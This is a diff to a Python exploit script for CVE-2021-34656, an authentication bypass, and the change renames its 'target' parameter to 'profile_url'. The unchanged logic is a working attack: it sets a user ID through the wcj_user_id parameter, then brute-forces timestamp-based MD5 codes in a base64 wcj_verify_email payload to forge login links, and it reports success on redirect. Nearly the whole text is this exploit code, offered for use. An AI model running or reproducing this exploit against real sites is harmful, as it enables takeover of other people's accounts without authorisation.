@@ -16,20 +16,20 @@ init(autoreset=True)
 DEFAULT_USER_ID = 1  
 COUNT = 5
 
-def generate_auth_url(target, count):
+def generate_auth_url(profile_url, count):
 
-    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Starting exploit for {target} with user ID {DEFAULT_USER_ID}...")
+    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Starting exploit for {profile_url} with user ID {DEFAULT_USER_ID}...")
 
     s = int(time.time())
     session = requests.Session()
     
-    session.get(f"{target}?wcj_user_id={DEFAULT_USER_ID}", verify=False)
+    session.get(f"{profile_url}?wcj_user_id={DEFAULT_USER_ID}", verify=False)
 
     for i in range(count):
         s = s + i
         s_hash = hashlib.md5(str(s).encode('utf-8')).hexdigest()
         wcj_verify_email_param = base64.b64encode(f'{{"id":"{DEFAULT_USER_ID}","code":"{s_hash}"}}'.encode()).decode('utf-8')
-        auth_url = f"{target}?wcj_verify_email={urllib.parse.quote(wcj_verify_email_param)}"
+        auth_url = f"{profile_url}?wcj_verify_email={urllib.parse.quote(wcj_verify_email_param)}"
         
         print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking: {auth_url}")
         r = session.get(auth_url, allow_redirects=False, verify=False)
@@ -43,9 +43,9 @@ def generate_auth_url(target, count):
     else:
         print(f"{Style.BRIGHT}{Fore.RED}[-] Exploit failed or no redirection detected.")
 
-def scan_cve_2021_34656(target):
+def scan_cve_2021_34656(profile_url):
 
-    generate_auth_url(target, COUNT)
+    generate_auth_url(profile_url, COUNT)
 
-    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Exploit finished for {target}.")
+    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Exploit finished for {profile_url}.")
     
